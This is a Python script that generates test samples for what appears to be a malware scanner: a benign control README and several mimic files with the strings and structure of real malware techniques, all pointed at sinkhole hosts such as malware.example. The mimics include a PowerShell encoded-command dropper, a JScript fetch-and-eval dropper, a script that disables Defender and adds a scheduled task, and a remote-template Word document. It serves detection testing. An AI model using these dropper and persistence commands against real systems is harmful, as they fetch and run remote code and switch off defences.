#!/usr/bin/env python3
"""Generate the inert sample corpus.

We ship this generator, not binaries. A reviewer can read exactly what every "sample"
contains — there is no opaque blob to trust, and nothing that any AV should ever flag,
because none of these files does anything: they carry the *strings and structure* of
malicious techniques (an encoded command, a remote-template relationship, a packed
section of random bytes) without a single working payload. Every network indicator points
at RFC-2606 / example-domain sinkholes (`malware.example`, `example.com`, `127.0.0.1`).

Run ``python fixtures/build.py`` to write them into ``fixtures/generated/`` (git-ignored).
Each builder returns bytes and a one-line description that doubles as its documentation.
"""

from __future__ import annotations

import base64
import gzip
import os
import struct
import zlib
from pathlib import Path

OUT_DIR = Path(__file__).resolve().parent / "generated"

# A benign sinkhole every fixture points at, so nothing here resolves to real infra.
SINK_URL = "http://malware.example/stage2.bin"
SINK_HOST = "malware.example"


def powershell_dropper() -> tuple[bytes, str]:
    inner = (
        "IEX (New-Object Net.WebClient).DownloadString('" + SINK_URL + "'); "
        "Start-Sleep -s 300; "
        "New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
        "-Name Updater -Value 'powershell -w hidden'"
    )
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
    body = f"powershell.exe -nop -w hidden -EncodedCommand {encoded}\n"
    return body.encode(), "PowerShell -EncodedCommand dropper: one base64/UTF-16LE hop to an IEX DownloadString, a Run key and a 300s sleep."


def js_dropper() -> tuple[bytes, str]:
    codes = ",".join(str(ord(c)) for c in "WScript.Shell")
    body = (
        "var s = String.fromCharCode(" + codes + ");\n"
        "var w = new ActiveXObject(s);\n"
        "var x = new ActiveXObject('MSXML2.XMLHTTP');\n"
        f"x.open('GET','{SINK_URL}',false); x.send();\n"
        "eval(x.responseText);\n"
    )
    return body.encode(), "JScript dropper: fromCharCode-obfuscated WScript.Shell, XMLHTTP fetch, eval of the response."


def gzip_b64_payload() -> tuple[bytes, str]:
    inner = (
        "Set-MpPreference -DisableRealtimeMonitoring $true; "
        "Invoke-WebRequest -Uri '" + SINK_URL + "' -OutFile $env:TEMP\\a.exe; "
        "schtasks /create /tn Updater /tr $env:TEMP\\a.exe /sc onlogon"
    )
    packed = base64.b64encode(gzip.compress(inner.encode())).decode()
    body = f"$b='{packed}';$d=[IO.Compression.GzipStream];iex ([Text.Encoding]::ASCII.GetString($b))\n"
    return body.encode(), "Two-layer payload: base64 -> gzip -> a script that disables Defender and installs a scheduled task."


def xor_config() -> tuple[bytes, str]:
    key = 0x5A
    clear = (
        b"This program cannot be run in DOS mode.\n"
        b"config: C2=" + SINK_URL.encode() + b"; UA=User-Agent: Mozilla/5.0; "
        b"beacon=60; wallet=example-not-a-real-address\n"
    )
    body = bytes(b ^ key for b in clear)
    return body, "Single-byte XOR (key 0x5A) config blob: recovered via the DOS-mode anchor, revealing the C2 URL."


def fake_pe() -> tuple[bytes, str]:
    """A minimal, non-runnable PE32 with a strings-bearing .text and a random-bytes
    .rsrc so the entropy heuristic fires. It has no valid entry point and does nothing."""
    text_body = (
        b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00"
        b"IsDebuggerPresent\x00GetAsyncKeyState\x00" + SINK_URL.encode() + b"\x00"
        b"kernel32.dll\x00"
    )
    rsrc_body = os.urandom(4096)  # high entropy -> triggers the packing note

    pe_off = 0x80
    opt_size = 0xE0
    file_align = 0x200

    dos = bytearray(b"MZ" + b"\x00" * (pe_off - 2))
    struct.pack_into("<I", dos, 0x3C, pe_off)

    coff = struct.pack(
        "<HHIIIHH",
        0x014C,   # machine i386
        2,        # number of sections
        0x5F5E1000,  # timestamp
        0, 0,     # symbol table ptr, count
        opt_size,
        0x0102,   # characteristics: executable | 32-bit machine
    )
    opt = bytearray(opt_size)
    struct.pack_into("<H", opt, 0, 0x010B)  # PE32 magic
    struct.pack_into("<H", opt, 68, 3)      # subsystem: console
    struct.pack_into("<I", opt, 92, 0)      # NumberOfRvaAndSizes: 0 (no directories)

    sec_headers_off = pe_off + 4 + 20 + opt_size
    text_ptr = file_align
    rsrc_ptr = text_ptr + _align(len(text_body), file_align)

    def section(name: bytes, vsize: int, va: int, raw_size: int, raw_ptr: int, flags: int) -> bytes:
        return (
            name.ljust(8, b"\x00")
            + struct.pack("<IIII", vsize, va, raw_size, raw_ptr)
            + struct.pack("<IIHH", 0, 0, 0, 0)
            + struct.pack("<I", flags)
        )

    text_hdr = section(b".text", 0x1000, 0x1000, len(text_body), text_ptr, 0x60000020)
    rsrc_hdr = section(b".rsrc", 0x1000, 0x2000, len(rsrc_body), rsrc_ptr, 0x40000040)

    out = bytearray()
    out += dos
    out += b"PE\x00\x00"
    out += coff
    out += opt
    out += text_hdr
    out += rsrc_hdr
    out += b"\x00" * (text_ptr - len(out))
    out += text_body
    out += b"\x00" * (rsrc_ptr - len(out))
    out += rsrc_body
    return bytes(out), "Non-runnable PE32: injection/keylog/anti-debug API strings in .text, a random-bytes .rsrc that trips the entropy heuristic."


def remote_template_docx() -> tuple[bytes, str]:
    """A minimal OOXML (ZIP) that carries an external attached-template relationship —
    the classic template-injection lure — pointing at the sinkhole. Contains no macro."""
    import io
    import zipfile

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr(
            "[Content_Types].xml",
            '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            "</Types>",
        )
        archive.writestr(
            "_rels/.rels",
            '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
            "</Relationships>",
        )
        archive.writestr("word/document.xml", '<?xml version="1.0"?><document><body/></document>')
        archive.writestr(
            "word/_rels/document.xml.rels",
            '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId100" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            f'Target="http://{SINK_HOST}/evil.dotm" TargetMode="External"/>'
            "</Relationships>",
        )
    return buffer.getvalue(), "OOXML .docx (no macro) with an external attachedTemplate relationship — remote template injection."


def clr_loader() -> tuple[bytes, str]:
    """A loader-shaped strings blob that trips the EXTENDED (PRO) rules.

    Every other fixture exercises the free tier. This one exists because a guarantee that
    is never exercised is not a guarantee: without a sample that fires an extended rule,
    "a PRO licence never changes a free-tier verdict" is true only because nothing ever
    happens, and the test asserting it passes vacuously. This blob carries the string
    evidence of ETW blinding, a named-pipe channel and in-memory CLR hosting alongside
    ordinary injection APIs, so free and PRO genuinely see different things — and the
    score still has to come out identical.

    Inert: strings only, no header, no entry point, nothing executable.
    """
    body = (
        b"ldr: stage two\n"
        b"GetProcAddress\x00ntdll.dll\x00EtwEventWrite\x00NtTraceEvent\x00"
        b"VirtualAlloc\x00WriteProcessMemory\x00CreateRemoteThread\x00"
        b"\\\\.\\pipe\\svcctl_a91f\x00CreateNamedPipeW\x00"
        b"ICLRRuntimeHost\x00CorBindToRuntime\x00mscoree.dll\x00"
        b"beacon=" + SINK_URL.encode() + b"\x00"
    )
    return body, "Loader strings blob: ETW blinding, a named-pipe channel and in-memory CLR hosting — the sample that exercises the extended (PRO) rule tier."


def benign_text() -> tuple[bytes, str]:
    body = (
        "# Deployment notes\n\n"
        "Run the installer, accept the licence, and reboot. Support: help@example.com.\n"
        "See https://example.com/docs for the configuration reference.\n"
    )
    return body.encode(), "Benign control sample: an ordinary README. Should score low and produce no capability matches."


BUILDERS = {
    "powershell_dropper.ps1": powershell_dropper,
    "js_dropper.js": js_dropper,
    "gzip_b64_payload.txt": gzip_b64_payload,
    "xor_config.bin": xor_config,
    "fake_injector.exe": fake_pe,
    "remote_template.docx": remote_template_docx,
    "clr_loader.bin": clr_loader,
    "benign_readme.txt": benign_text,
}


def _align(value: int, alignment: int) -> int:
    return (value + alignment - 1) // alignment * alignment


def build(out_dir: Path = OUT_DIR) -> dict[str, str]:
    """Write every fixture and return {filename: description}."""
    out_dir.mkdir(parents=True, exist_ok=True)
    manifest: dict[str, str] = {}
    for name, builder in BUILDERS.items():
        data, description = builder()
        (out_dir / name).write_bytes(data)
        manifest[name] = description
    # zlib import kept meaningful: sanity-check the environment can round-trip deflate,
    # which the deobfuscator relies on. Fail loudly here rather than mysteriously later.
    assert zlib.decompress(zlib.compress(b"ok")) == b"ok"
    return manifest


if __name__ == "__main__":
    result = build()
    print(f"Wrote {len(result)} fixtures to {OUT_DIR}:\n")
    for name, description in result.items():
        print(f"  {name}\n    {description}\n")
